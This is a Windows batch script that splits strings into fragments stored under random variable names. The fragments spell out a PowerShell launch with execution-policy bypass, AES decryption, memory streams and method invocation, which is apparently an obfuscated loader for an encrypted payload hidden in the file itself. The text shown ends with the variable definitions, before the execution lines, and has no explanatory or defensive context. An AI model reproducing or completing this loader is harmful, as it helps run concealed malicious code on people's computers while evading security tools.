@echo off
set "flThrvAOJh= /"
set "SXlWAQhYui=he"
set "COGQzJywWE=we"
set "wITSIggCKO=Po"
set "YJWcvPuGhe=xe"
set "DtZXcCaRHp=s\"
set "FboOTEmDmX=0\"
set "PPnSwRRRWa=ws"
set "aEjkyZyHTG=ll"
set "SQRSJqOQqT=Wi"
set "pXFHSbdUcz=:\"
set "ZwpvyfQvqn=po"
set "XiYJjpAPJD=nd"
set "hjfqNeXCpR=co"
set "aJYhgrggyn=rs"
set "MGDHVnjnqs=we"
set "mxuSnQazyl=1."
set "HOmkwpiAhN=\W"
set "XXpQoRhQsL=do"
set "ALNhsodxhh=he"
set "uYnUXqxiph=.e"
set "irhvYiTJiR=rS"
set "GectpEjbGH=em"
set "TznSSTJrZj=y "
set "JDlYCFKKNX=ow"
set "AokzQoETpd=st"
set "tvVsReBxUA=\v"
set "tSJqGkuuqq= C"
set "YhCEJsCKhO=in"
set "wEextgYWxD=Sy"
set "KEfEjaixtM=ll"
set "oIhugezOFw=32"
set "DqrGYHnbxU=py"
set "JxFnyXMAOC= %~dp0"
set "kCbuGziBOw=cd"
set "nbZYOGSXwF=-ep "
set "HklXzjbtxB= = $"
set "fclAApCrNM=hy.A"
set "hPeNrpoPZL=null"
set "YJwmCaWdJk=();$"
set "KaBQmUSQqS=[]] "
set "DGOyDItBQS=Syst"
set "LmSQAbTdNc=] -j"
set "KLzWKiwNeK=d;$M"
set "sewmqDxPur=.Mem"
set "VZFsqRymgs=vert"
set "JrpfgRNCLj=1] -"
set "MJWsvZZfPa=e]::"
set "qlsZoKinQe=.Cre"
set "EWQjHdorEC=);$M"
set "YWZEwaBOwA=bypa"
set "foDZoPjtAx=;$qR"
set "ONONHPGCGc=lit("
set "wGDhEtaUHJ=QyRa"
set "aerJjAPykG=[Sys"
set "UwojAFHhYF=[Sys"
set "BEMxorXCzu=$QyR"
set "yWnahtqFMA=('%*'"
set "syRuPuZarS=.Cry"
set "XTXUmYXfoW=gMod"
set "cGtjwuXFnw=Obje"
set "yuZjxAKLOA='0Pg"
set "BtkIcdgWqs=stem"
set "hqulEYQACW=Invo"
set "fpylqSrYkb=6] -"
set "tkwjMXhhdX=tgJm"
set "AAKNkECbyC=n.Pa"
set "xVlrioEIgX=.Cop"
set "CXanmWHBPH=De ="
